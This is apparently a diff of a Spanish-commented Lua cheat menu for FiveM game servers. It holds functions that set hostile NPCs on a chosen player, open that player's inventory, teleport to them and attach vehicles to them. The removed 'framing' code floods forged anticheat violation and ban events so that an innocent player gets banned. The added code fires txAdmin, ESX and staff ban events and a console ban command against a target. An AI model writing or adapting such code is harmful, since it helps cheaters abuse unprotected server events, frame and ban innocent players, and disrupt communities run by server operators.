@@ -1,6 +1,6 @@
 --[[
-    SENTEX MENU - v3.6 Beta + Framing Attack (solo para FiveGuard)
-    Abre con PAGEDOWN - Sin fuzzing, sin hooks, estable.
+    SENTEX MENU - v3.6 Beta (con opción de baneo simple)
+    Abre con PAGEDOWN
 ]]
 
 local _r = math.random
@@ -119,6 +119,7 @@ local function _revivirJugador(pid)
     end
 end
 
+-- VEHÍCULO
 local function _repararVeh(v)
     if not v then v = GetVehiclePedIsIn(PlayerPedId(), false) end
     if v and v ~= 0 then
@@ -299,7 +300,7 @@ local function _nombreJugador(pid)
     return "Jugador "..pid
 end
 
--- SPAWN NPCs
+-- ========== SPAWN NPCs CONTRA UN JUGADOR ESPECÍFICO ==========
 local function _spawnNPCs(tgt, cantidad)
     cantidad = cantidad or _r(3, 6)
     local tgtPed = GetPlayerPed(tgt)
@@ -341,7 +342,7 @@ local function _spawnNPCs(tgt, cantidad)
     _notify("~r~"..cantidad.." NPCs hostiles atacando a ".._nombreJugador(tgt))
 end
 
--- INVENTARIO
+-- ABRIR INVENTARIO MULTI-FRAMEWORK
 local function _abrirInventario(tgt)
     local sid = GetPlayerServerId(tgt)
     if not sid then _notify("~r~No se pudo obtener Server ID") return end
@@ -374,6 +375,7 @@ local function _teleportTo(tgt)
     end
 end
 
+-- ENGANCHAR VEHÍCULO MÁS CERCANO AL JUGADOR OBJETIVO
 local function _engancharVehCercano(tgt)
     local tgtPed = GetPlayerPed(tgt)
     if not tgtPed or tgtPed == 0 then _notify("~r~Jugador no encontrado") return end
@@ -402,29 +404,30 @@ local function _engancharVehCercano(tgt)
     end
 end
 
--- ========== NUEVA FUNCIÓN DE FRAMING ==========
-local function _framingAttack(pid)
+-- ========== NUEVA FUNCIÓN DE BAN SIMPLE (SIN SPAM) ==========
+local function _banJugador(pid)
     local targetServerId = GetPlayerServerId(pid)
     local targetName = _nombreJugador(pid)
     if not targetServerId then _notify("~r~Error al obtener ID") return end
 
-    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Razón del baneo (falsa):", "", "", "", 50)
+    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Razón del baneo:", "", "", "", 50)
     while UpdateOnscreenKeyboard() == 0 do _w(0) end
     local reason = GetOnscreenKeyboardResult()
     if reason == nil or reason == "" then reason = "Cheating detected"
 
-    _notify("~y~[Framing] Atacando a "..targetName.." (ID: "..targetServerId..")")
+    _notify("~y~Intentando banear a "..targetName.." (ID: "..targetServerId..") - "..reason)
 
-    for i = 1, 150 do
-        TriggerServerEvent('FiveGuard:AddViolation', targetServerId, 'EXPLOIT', 100)
-        TriggerServerEvent('anticheat:report', targetServerId, 'speedhack', 100)
-        TriggerServerEvent('anticheat:godmode', targetServerId, true)
-        TriggerServerEvent('anticheat:teleport_hack', targetServerId, math.random(-5000,5000), math.random(-5000,5000))
-        TriggerServerEvent('admin:ban', targetServerId, reason)
-        TriggerServerEvent('staff:ban', targetServerId, reason)
-        _w(10)
-    end
-    _notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
+    -- Comando de consola local (funciona si el servidor lo permite o eres admin)
+    ExecuteCommand(('ban %d "%s"'):format(targetServerId, reason))
+
+    -- Eventos comunes de administración (sin bucles)
+    TriggerServerEvent('txAdmin:banPlayer', targetServerId, reason, 0)
+    TriggerServerEvent('admin:ban', targetServerId, reason)
+    TriggerServerEvent('staff:banPlayer', targetServerId, reason)
+    TriggerServerEvent('esx:banPlayer', targetServerId, reason)
+    TriggerServerEvent('FiveGuard:AddViolation', targetServerId, 'EXPLOIT', 100)
+
+    _notify("~r~Intento de baneo completado. Revisa si el jugador fue expulsado.")
 end
 
 local _siguienteJugador = nil
@@ -446,7 +449,7 @@ local function _crearAccion(pid, tipo)
         elseif tipo=="teleport" then _teleportTo(pid)
         elseif tipo=="spawnnpc" then _spawnNPCs(pid, _r(3,6))
         elseif tipo=="attachveh" then _engancharVehCercano(pid)
-        elseif tipo=="framing" then _framingAttack(pid)
+        elseif tipo=="ban" then _banJugador(pid)
         end
     end
 end
@@ -1147,7 +1150,7 @@ local function _refrescarListaJugadores()
                 {nombre="• Teleportar", accion=_crearAccion(pid,"teleport"), desc="Teletransportarse a él"},
                 {nombre="• Spawn NPCs (3-6)", accion=_crearAccion(pid,"spawnnpc"), desc="Spawns múltiples NPCs hostiles (no se atacan entre sí)"},
                 {nombre="• Enganchar vehículo cercano", accion=_crearAccion(pid,"attachveh"), desc="Engancha el vehículo más cercano al jugador"},
-                {nombre="• Framing (FiveGuard)", accion=_crearAccion(pid,"framing"), desc="Intenta que FiveGuard bane al jugador"},
+                {nombre="• Banear (simple)", accion=_crearAccion(pid,"ban"), desc="Intenta banear usando comandos y eventos comunes"},
             }
         end
     end
